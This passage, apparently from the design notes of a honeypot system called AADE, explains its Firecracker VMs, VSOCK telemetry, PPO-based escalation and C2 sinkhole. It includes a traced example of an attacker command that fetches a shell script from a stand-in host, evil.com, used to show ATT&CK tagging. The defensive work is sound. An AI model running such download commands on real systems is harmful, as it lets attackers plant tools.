   → prints: [INTEL] root@prod-web-01:/root$ wget http://evil.com/shell.sh

8. dashboard.py GET /api/stats (polled by frontend every ~5s):
   → reads session_2026-04-14.jsonl
   → ttp_counts["T1105"] = {"name": "Ingress Tool Transfer", "count": 1}
   → mode = "ADAPTIVE (High Interaction)"  [event from non-cowrie hostname]
   → response includes this in ttp_counts and total_commands

9. Browser dashboard refreshes:
   → ATT&CK heatmap: C&C column lights up (T1105)
   → Command feed: shows wget command with T1105 badge
   → Mode indicator: "ADAPTIVE"
   → Synthetic Responses count: unchanged (no LLM triggered for this cmd)
```

Total latency from keystroke to dashboard: approximately 1–3 seconds (dominated by VSOCK roundtrip and Flask polling interval).

---

## 7. Key Design Decisions

**Why Firecracker instead of Docker or a chroot?**
Docker and chroots share the host kernel. A determined attacker can fingerprint this (same PID namespace leakage, recognizable `/proc` entries, timing differences). Firecracker provides a real separate kernel, making kernel fingerprinting attacks return genuinely different results.

**Why AF_VSOCK instead of a reverse shell or SSH tunnel for telemetry?**
Any network-based telemetry channel is visible to the attacker (they can run `netstat`, `ss`, or `tcpdump`). AF_VSOCK is a kernel-internal channel — it is completely invisible to anything running inside the VM. There is no socket in `netstat`, no traffic in tcpdump, no process in `ps`.

**Why PPO (Proximal Policy Optimization) for the RL agent?**
The state space is continuous and small (4 dimensions), and the action space is discrete (3 actions). PPO handles this well without needing a large number of training steps. The fallback rule-based logic (`if risk > 50: ESCALATE`) ensures the system works even without a trained model.

**Why log to `.jsonl` instead of a database?**
JSONL (newline-delimited JSON) is append-only, requires no server process, survives crashes without data loss, and can be read with standard Unix tools (`grep`, `jq`, `tail -f`). The dashboard reads it with simple Python file I/O. This keeps the system deployable on a minimal Kali install with zero additional infrastructure.

**Why return `200 OK` from the C2 sinkhole instead of dropping the connection?**
Dropping connections tells the malware (and the attacker watching) that the C2 is unreachable. A convincing `200 OK` with a JSON body keeps the malware in its active loop, executing commands and revealing more TTPs. Some malware also has dead-man-switch logic: if C2 is unreachable for N minutes, it deletes itself. The fake response prevents that.

**Why does the LLM synthesis only trigger on T1083 and T1082?**
These are the recon commands where a convincing fake response matters most. For high-severity commands (wget, chmod, reverse shells), the system doesn't need to fake output — it needs to log the event and let the attacker proceed so more TTPs are revealed. Synthesis for every command would also be slow and potentially inconsistent.

---

*This document covers the complete AADE codebase as of the initial commit. All logic described is derived directly from the source files.*
